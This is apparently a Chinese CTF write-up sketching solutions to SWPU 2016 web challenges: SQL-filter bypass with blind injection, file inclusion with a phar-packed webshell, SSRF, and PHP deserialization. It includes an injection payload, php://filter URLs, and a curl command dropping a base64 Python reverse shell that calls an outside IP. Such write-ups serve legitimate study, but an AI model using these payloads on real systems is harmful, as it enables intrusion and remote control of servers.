+由于连不上服务器，python脚本也写不了，所以有些题就只有思路，也不算wp。
+加上我个人对题目的理解和分析，由于没有实际做题，如果有问题希望大家指正</p>
+<h2 id="web50">web 50</h2>
+<p style="max-width:100%;height:auto;">源码里面拿到flag</p>
+<h2 id="web2001">web 200-1</h2>
+<p style="max-width:100%;height:auto;">一个什么流量监控系统,在响应头里面拿到<code style="max-width:100%;height:auto;">base64</code>编码的tips,如下:</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$query="SELECT * FROM admin WHERE uname=&amp;apos;".$uname."&amp;apos;";
+if ($row[&amp;apos;passwd&amp;apos;]===$passwd)
+{
+$_SESSION[&amp;apos;flag&amp;apos;] = 1;
+</code></pre>
+<p style="max-width:100%;height:auto;">过滤了很多，空格、#、*、union、、and、or、|、+，--、&amp;、%0a、%0b、%0c、%0d等等，也就没法用联合查询来绕过什么的，也就直接转想盲注把。
+这里我们很容易发现问题所在，并且可以利用来进行盲注
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101145908147" style="max-width:100%;height:auto;"/><br/>
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101145925661" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">观察上面两张图返回完全不一样的答案，所以写个脚本就能猜解出passwd了
+这里脚本我就懒得写了。没有VPS懒得代理了。</p>
+<h2 id="web2002">web 200-2</h2>
+<p style="max-width:100%;height:auto;">也是懒得解决代理问题，
+简单扫一下发现存在备份文件。<code style="max-width:100%;height:auto;">index.php.bak</code>如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(isset($_COOKIE[&amp;apos;user&amp;apos;]))
+{ $login = @unserialize(base64_decode($_COOKIE[&amp;apos;user&amp;apos;]));
+if(!empty($login-&gt;pass)){
+    $status = $login-&gt;check_login();
+    if($status == 1){
+        $_SESSION[&amp;apos;login&amp;apos;] = 1;
+        var_dump("login by cookie!!!");
+    }
+ }
+ }
+</code></pre>
+<p style="max-width:100%;height:auto;">感觉少了些什么，不过肯定是个反序列化漏洞，肯定还有其他文件，换个再扫一下发现了一个<code style="max-width:100%;height:auto;">function.php</code>,而且也是有备份文件的<code style="max-width:100%;height:auto;">function.php.bak</code>,太多不贴代码了。
+就是一个反序列化构造，绕过<code style="max-width:100%;height:auto;">checksql()</code>函数，然后还是因为网络原因暂时没法儿用burp，也懒得下其他浏览器插件来改cookie，也就没有实际做这道题。
+由于最近恰好在做代码审计，发现这个过滤感觉挺像<code style="max-width:100%;height:auto;">80sec-ids</code>的过滤，刚看完不久
+附链接：http://www.cheery.win/?p=119可以用单撇号来bypass。</p>
+<p style="max-width:100%;height:auto;">PS：正常的80sec-ids最初的匹配是</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(preg_match(&amp;apos;/[^0-9a-z@._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@.-]{1,}/&amp;apos;, $sql))
+{
+$this-&amp;gt;DisplayError("$sql||SelectBreak",1);
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">但是本题的是：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if ($querytype == &amp;apos;select&amp;apos;) {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(load_file|outfile)[^0-9a-z@\.-]{1,}";
+            if (preg_match("/".$notallow1."/i", $db_string)) {
+                exit("Error");
+            }
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">所以猜测这里多半会用<code style="max-width:100%;height:auto;">sleep、benchmark</code>什么的把。
+接下来这里我结合自己分析下这个改版的<code style="max-width:100%;height:auto;">80sec-ids</code>把。
+首先第一部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if ($querytype == &amp;apos;select&amp;apos;) {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(load_file|outfile)[^0-9a-z@\.-]{1,}";
+            if (preg_match("/".$notallow1."/i", $db_string)) {
+                exit("Error");
+            }
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">这里过滤<code style="max-width:100%;height:auto;">select</code>语句的一些特殊语法，不过这里没有直接过滤<code style="max-width:100%;height:auto;">sleep</code>和<code style="max-width:100%;height:auto;">benchmark</code>，所以就有机会bypass。
+接下来就是关键部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">while (TRUE) {
+            $pos = strpos($db_string, &amp;apos;\&amp;apos;&amp;apos;, $pos + 1);
+            if ($pos === FALSE) {
+                break;
+            }
+            $clean.= substr($db_string, $old_pos, $pos - $old_pos);
+            while (TRUE) {
+                $pos1 = strpos($db_string, &amp;apos;\&amp;apos;&amp;apos;, $pos + 1);
+                $pos2 = strpos($db_string, &amp;apos;\\&amp;apos;, $pos + 1);
+                if ($pos1 === FALSE) {
+                    break;
+                }
+                elseif($pos2 == FALSE || $pos2 &gt; $pos1) {
+                    $pos = $pos1;
+                    break;
+                }
+                $pos = $pos2 + 1;
+            }
+            $clean.= &amp;apos;$s$&amp;apos;;
+            $old_pos = $pos + 1;
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">这里通过匹配 <code style="max-width:100%;height:auto;">‘</code>确定提取出每两个单引号直接的内容，并且将其中的内容通过 substr()函数截断下来，再将剩下来的语句进行匹配，所以只要我们将我们需要的语句藏在 两个单引号之间就OK了</p>
+<p style="max-width:100%;height:auto;">简单的说就是如下图所示，我输入第一行，然后被一通操作搞成第二行的样子然后进行接下来的过滤。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150057179" style="max-width:100%;height:auto;"/><br/>
+也就是说，下述的过滤代码都是对第二行这样子的进行过滤，所以我们就可以把我们的东西藏在单引号里面来bypass</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">        if (strpos($clean, &amp;apos;@&amp;apos;) !== FALSE OR strpos($clean, &amp;apos;char(&amp;apos;) !== FALSE OR strpos($clean, &amp;apos;"&amp;apos;) !== FALSE OR strpos($clean, &amp;apos;$s$$s$&amp;apos;) !== FALSE) {
+            $fail = TRUE;
+            if (preg_match("#^create table#i", $clean)) $fail = FALSE;
+            $error = "unusual character";
+        }
+        elseif(strpos($clean, &amp;apos;/*&amp;apos;) !== FALSE || strpos($clean, &amp;apos;-- &amp;apos;) !== FALSE || strpos($clean, &amp;apos;#&amp;apos;) !== FALSE) {
+            $fail = TRUE;
+            $error = "comment detect";
+        }
+        elseif(strpos($clean, &amp;apos;sleep&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])sleep($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "slown down detect";
+        }
+        elseif(strpos($clean, &amp;apos;benchmark&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])benchmark($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "slown down detect";
+        }
+        elseif(strpos($clean, &amp;apos;load_file&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])load_file($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "file fun detect";
+        }
+        elseif(strpos($clean, &amp;apos;into outfile&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])into\s+outfile($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "file fun detect";
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">所以总的来说我们这里肯定是利用<code style="max-width:100%;height:auto;">sleep</code>进行bool盲注，所以就需要把<code style="max-width:100%;height:auto;">sleep</code>藏在两个单引号之间。
+再简单的说，下面两个句子的效果是一样的。</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">select `&amp;apos;`.``.passwd from admin;   
+select passwd from admin;
+</code></pre>
+<p style="max-width:100%;height:auto;">但是利用上面的句子我们可以bypass掉过滤，这样我们就可以构造sql语句进行爆破了，给个poc如下：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">admin&amp;apos; and (select 1 from flag where ascii(substring(flag,1,1))=30) and (`&amp;apos;`.``.flag=1 or sleep(5)) #
+</code></pre>
+<p style="max-width:100%;height:auto;">另外我们还要注意一个地方，
+<code style="max-width:100%;height:auto;">login()</code>函数，如果我们想要搞定这个，就需要把里面的<code style="max-width:100%;height:auto;">__wakeup</code>给pass掉，我之前分析过这个漏洞，
+链接：http://blog.csdn.net/qq_19876131/article/details/52890854
+所以综上就可以做题了。具体就没操作了，要是分析的有问题希望大家指正</p>
+<h2 id="web100web2003">web 100 和web 200-3</h2>
+<p style="max-width:100%;height:auto;">文件包含，这里注意它会在你的输入后面强制加上<code style="max-width:100%;height:auto;">.php</code>，所以通过<code style="max-width:100%;height:auto;">php://filter</code>读源码的时候要注意下</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://web2.08067.me/include.php?file=php://filter/convert.base64-encode/resource=upload
+http://web2.08067.me/include.php?file=php://filter/convert.base64-encode/resource=include
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到<code style="max-width:100%;height:auto;">include.php</code>如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+Tips: the parameter is file! :)
+&lt;!-- upload.php --&gt;
+&lt;/html&gt;
+&lt;?php
+    @$file = $_GET["file"];
+    if(isset($file))
+    {
+        if (preg_match(&amp;apos;/http|data|ftp|input|%00/i&amp;apos;, $file) || strstr($file,"..") !== FALSE || strlen($file)&gt;=70)
+        {
+            echo "&lt;p&gt; error! &lt;/p&gt;";
+        }
+        else
+        {
+            include($file.&amp;apos;.php&amp;apos;);
+        }
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后<code style="max-width:100%;height:auto;">upload.php</code>如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;form action="" enctype="multipart/form-data" method="post"
+name="upload"&gt;file:&lt;input type="file" name="file" /&gt;&lt;br&gt;
+&lt;input type="submit" value="upload" /&gt;&lt;/form&gt;
+
+&lt;?php
+if(!empty($_FILES["file"]))
+{
+    echo $_FILE["file"];
+    $allowedExts = array("gif", "jpeg", "jpg", "png");
+    @$temp = explode(".", $_FILES["file"]["name"]);
+    $extension = end($temp);
+    if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg")
+    || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg")
+    || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png"))
+    &amp;&amp; (@$_FILES["file"]["size"] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts))
+    {
+        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
+        echo "file upload successful!Save in:  " . "upload/" . $_FILES["file"]["name"];
+    }
+    else
+    {
+        echo "upload failed!";
+    }
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">观察这里用白名单来过滤，那么想到伪协议什么的，吧一句话写到一个php里面，压缩成zip，再改名上传，用zip或是phar包含应该就可以了，
+注意这里一句话的传参数不能用get（好吧估计也就我个人喜欢用GET）。
+具体操作就是
+创建一个bendawang.php，写入一句话，然后压缩成<code style="max-width:100%;height:auto;">bdw.zip</code>，该后缀为<code style="max-width:100%;height:auto;">bdw.jpg</code>，上传，然后访问<code style="max-width:100%;height:auto;">http://web2.08067.me/include.php?file=phar://upload/bdw.jpg/bendawang</code>，如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150144415" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150153962" style="max-width:100%;height:auto;"/><br/>
+拿到flag并且拿到下一个tip，
+利用webshell先反弹个shell好操作一些，再执行如下代码，往我自己的vps上弹一个shell。</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -d "a=%24f%3Dfopen%28%22%2ftmp%2fa.py%22%2C%22wb%22%29%3Bfwrite%28%24f%2Cbase64_decode%28%22aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwNC4xNjAuNDMuMTU0Iiw1NTU1NSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7%22%29%29%3B%0Afclose%28%24f%29%3Bsystem%28%22python%20%2ftmp%2fa.py%22%29%3B" "http://web2.08067.me/include.php?file=phar://upload/bdw.jpg/bendawang"
+</code></pre>
+<p style="max-width:100%;height:auto;">根据tomcat加root那么都不用想肯定是提权，那就是最近的<code style="max-width:100%;height:auto;">CVE-2016-1240</code>了。
+<code style="max-width:100%;height:auto;">freebuf</code>上有poc，但是这里要注意需要的是tomcat的用户才能提权，现在已经有<code style="max-width:100%;height:auto;">www-date</code>的shell了，往tomcat目录下写个jsp马
+如下，没用自己的电脑做所以临时找的比较挫不过没事：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150229165" style="max-width:100%;height:auto;"/><br/>
+接下来就是回连，以及执行poc，由于网速太渣和服务器太渣，实在是太慢了，后续工作就没有做了。</p>
+<h2 id="web300">web 300</h2>
+<p style="max-width:100%;height:auto;">一个明显的ssrf，<code style="max-width:100%;height:auto;">file:///etc/issue</code>读到是centos，然后查看网卡信息<code style="max-width:100%;height:auto;">/etc/sysconfig/network-scripts/ifcfg-eth0</code>，如下：
+ <br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150304166" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">写个脚本跑下发现<code style="max-width:100%;height:auto;">172.16.181.166</code>开着80端口，根据回显应该就是这个ip了，
+然后在那字典跑目录，发现存在一个/admin目录
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150321947" style="max-width:100%;height:auto;"/><br/>
+下面还有个<code style="max-width:100%;height:auto;">login.php</code>，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;html lang="en"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;/head&gt;&lt;body class="signin"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"&gt;
+    &lt;title&gt;wllmctf管理中心&lt;/title&gt;
+            &lt;form method="post" action=wllmctf_login.php&gt;
+                &lt;h4 class="no-margins"&gt;后台登录&lt;/h4&gt;
+                &lt;input type="text" class="form-control uname" id="user" name="username" placeholder="用户名"&gt;
+                &lt;input type="password" class="form-control pword m-b" name="password" placeholder="密码"&gt;
+                &lt;button id="submit" name="submit" class="btn btn-success btn-block"&gt;登录&lt;/button&gt;
+            &lt;/form&gt;
+&lt;!-- Mirrored from www.zi-han.net/theme/hplus/login_v2.html by HTTrack Website Copier/3.x [XR&amp;CO&amp;apos;2014], Wed, 20 Jan 2016 14:19:52 GMT --&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<h2 id="web400">web 400</h2>
+<p style="max-width:100%;height:auto;">进入网页折腾半天没什么收获，然后扫了下目录发现个<code style="max-width:100%;height:auto;">web.zip</code>，里面有源码，代码审计。
+首先看<code style="max-width:100%;height:auto;">common.php</code>，重点这部分
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150354260" style="max-width:100%;height:auto;"/><br/>
+把传参直接搞成变量，必然存在变量覆盖问题。
+但是找找可用的变量，只有在<code style="max-width:100%;height:auto;">riji.php</code>下面，有一个<code style="max-width:100%;height:auto;">$id</code>变量，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+require_once("common.php");
+session_start();
+if (@$_SESSION[&amp;apos;login&amp;apos;] !== 1)
+{
+   header(&amp;apos;Location:/web/index.php&amp;apos;);
+  exit();
+}
+if($_SESSION[&amp;apos;user&amp;apos;])
+{
+  $username = $_SESSION[&amp;apos;user&amp;apos;];
+  @mysql_conn();
+  $sql = "select * from user where name=&amp;apos;$username&amp;apos;";
+  $result = @mysql_fetch_array(mysql_query($sql));
+  mysql_close();
+  if($result[&amp;apos;userid&amp;apos;])
+  {
+     $id = intval($result[&amp;apos;userid&amp;apos;]);
+  }
+}
+else
+{
+  exit();
+}
+?&gt;
+&lt;!DOCTYPE HTML&gt;
+&lt;html lang="zh-CN"&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;日记系统&lt;/title&gt;
+&lt;meta name="keywords" content="日记系统" /&gt;
+&lt;meta name="description" content="" /&gt;
+&lt;link rel="stylesheet" href="css/index.css"/&gt;
+&lt;link rel="stylesheet" href="css/style.css"/&gt;
+&lt;link rel="stylesheet" href="css/animate.css"/&gt;
+&lt;script type="text/javascript" src="js/jquery1.42.min.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="js/jquery.SuperSlide.2.1.1.js"&gt;&lt;/script&gt;
+&lt;!--[if lt IE 9]&gt;
+&lt;script src="js/html5.js"&gt;&lt;/script&gt;
+&lt;![endif]--&gt;
+&lt;/head&gt;
+&lt;body&gt;
+     &lt;!--header start--&gt;
+   &lt;div id="header"&gt;
+     &lt;h1&gt;日记系统&lt;/h1&gt;
+     &lt;p&gt;一个给小美的日记系统&lt;/p&gt;    
+   &lt;/div&gt;
+    &lt;!--header end--&gt;
+   &lt;!--nav--&gt;
+    &lt;div id="nav"&gt;
+        &lt;ul&gt;
+        &lt;li&gt;&lt;a href="index.php"&gt;登陆&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="forget.php"&gt;找回密码&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href="riji.php"&gt;个人日记&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href="guestbook.php"&gt;写日记&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="logoff.php?off=1"&gt;注销&lt;/a&gt;&lt;/li&gt;
+        &lt;div class="clear"&gt;&lt;/div&gt;
+       &lt;/ul&gt;
+     &lt;/div&gt;
+      &lt;!--nav end--&gt;
+   &lt;!--content start--&gt;
+   &lt;div id="content"&gt;
+      &lt;!--left--&gt;
+        &lt;div class="left" id="riji"&gt;
+          &lt;div class="weizi"&gt;
+          &lt;div class="wz_text"&gt;当前位置：&lt;a href="#"&gt;首页&lt;/a&gt;&gt;&lt;h1&gt;个人日记&lt;/h1&gt;&lt;/div&gt;
+          &lt;/div&gt;
+          &lt;div class="rj_content"&gt;
+           &lt;?php
+           @mysql_conn();
+           $sql1 = "select * from msg where userid= $id order by id";
+           $query = mysql_query($sql1);
+           $result1 = array();
+           while($temp=mysql_fetch_assoc($query)) {
+              $result1[]=$temp;
+           }
+           mysql_close();
+           foreach($result1 as $x=&gt;$o)
+           {
+              echo display($o[&amp;apos;msg&amp;apos;]);
+           }
+           ?&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">但是我们观察第一部分代码，既然我们要覆盖，那么我们就不能让<code style="max-width:100%;height:auto;">$result[&amp;apos;userid&amp;apos;]</code>有值，但是我们还要必须保证<code style="max-width:100%;height:auto;">$_SESSION[&amp;apos;user&amp;apos;]</code>有值，不然就会<code style="max-width:100%;height:auto;">exit</code>，这里问题就是，我们如何做到没有这个用户但还要保留这个用户的<code style="max-width:100%;height:auto;">$session</code>，这里没有用到的<code style="max-width:100%;height:auto;">api.php</code>就起到作用了。</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+require_once("common.php");
+session_start();
+if (@$_SESSION[&amp;apos;login&amp;apos;] === 1){
+   header(&amp;apos;Location:/web/riji.php&amp;apos;);
+  exit();
+}
+class admin {
+  var $name;
+  var $check;
+  var $data;
+  var $method;
+  var $userid;
+  var $msgid;
+  function check(){
+     $username = addslashes($this-&gt;name);//�������ݿ�����ݽ���ת��
+     @mysql_conn();
+     $sql = "select * from user where name=&amp;apos;$username&amp;apos;";
+     $result = @mysql_fetch_array(mysql_query($sql));
+     mysql_close();
+     if(!empty($result)){
+        //���� salt ��֤�Ƿ�Ϊ���û�
+        if($this-&gt;check === md5($result[&amp;apos;salt&amp;apos;] . $this-&gt;data . $username)){
+           echo &amp;apos;(=-=)!!&amp;apos;;
+           if($result[&amp;apos;role&amp;apos;] == 1){//����Ƿ�Ϊadmin�û�
+              return 1;
+           }
+           else{
+              return 0;
+           }
+        }
+        else{
+           return 0;
+        }
+     }
+     else{
+        return 0;
+     }
+  }
+  function do_method(){
+     if($this-&gt;check() === 1){
+        if($this-&gt;method === &amp;apos;del_msg&amp;apos;){
+           $this-&gt;del_msg();
+        }
+        elseif($this-&gt;method === &amp;apos;del_user&amp;apos;){
+           $this-&gt;del_user();
+        }
+        else{
+           exit();
+        }
+     }
+  }
+  function del_msg(){
+     if($this-&gt;msgid)
+     {
+        $msg_id = intval($this-&gt;msgid);//��ע��
+        @mysql_conn();
+        $sql1 = "DELETE FROM msg where id=&amp;apos;$msg_id&amp;apos;";
+        if(mysql_query($sql1)){
+           echo(&amp;apos;&lt;script&gt;alert("Delete message success!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        else{
+           echo(&amp;apos;&lt;script&gt;alert("Delete message wrong!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        mysql_close();
+     }
+     else{
+        echo(&amp;apos;&lt;script&gt;alert("Check Your msg_id!!")&lt;/script&gt;&amp;apos;);
+        exit();
+     }
+  }
+  function del_user(){
+     if($this-&gt;userid){
+        $user_id = intval($this-&gt;userid);//��ע��
+        if($user_id == 1){
+           echo(&amp;apos;&lt;script&gt;alert("Admin can\&amp;apos;t delete!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        @mysql_conn();
+              $sql2 = "DELETE FROM user where userid=&amp;apos;$user_id&amp;apos;";
+        if(mysql_query($sql2)){
+           echo(&amp;apos;&lt;script&gt;alert("Delete user success!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        else{
+           echo(&amp;apos;&lt;script&gt;alert("Delete user wrong!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        mysql_close();
+     }
+     else{
+        echo(&amp;apos;&lt;script&gt;alert("Check Your user_id!!")&lt;/script&gt;&amp;apos;);
+        exit();
+     }
+  }
+}
+$a = unserialize(base64_decode($api));
+$a-&gt;do_method();
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">非常明显的反序列化注入，而且正好能够删除用户，加上代码里面没有地方销毁session,那么正好是我们所想要达到的目标。
+但是我们看看代码，有一个<code style="max-width:100%;height:auto;">check()</code>函数被调用了，如果能够绕过就很方便了，看看函数，重点部分：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if($this-&gt;check === md5($result[&amp;apos;salt&amp;apos;] . $this-&gt;data . $username)){
+           echo &amp;apos;(=-=)!!&amp;apos;;
+           if($result[&amp;apos;role&amp;apos;] == 1){//����Ƿ�Ϊadmin�û�
+              return 1;
+           }
+           else{
+              return 0;
+           }
+</code></pre>
+<p style="max-width:100%;height:auto;">这里需要获取<code style="max-width:100%;height:auto;">$salt</code>，但是我们看看<code style="max-width:100%;height:auto;">index.php</code>。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150419793" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">所以全部都在cookie里面了，所以接下来就可以删除用户了，然后到达覆盖变量id的目的，从而完成注入。由于没有实际做题，所以后续的做法也不知道，就只能分析到这里了。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./SWPU-2016-web-部分思路整理/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./SWPU-2016-web-部分思路整理/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./SWPU-2016-web-部分思路整理/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./SWPU-2016-web-部分思路整理/prism.js"></script>
+<script src="./SWPU-2016-web-部分思路整理/zooming.js"></script>
+<script src="./SWPU-2016-web-部分思路整理/Bendawang.js"></script>
+
+
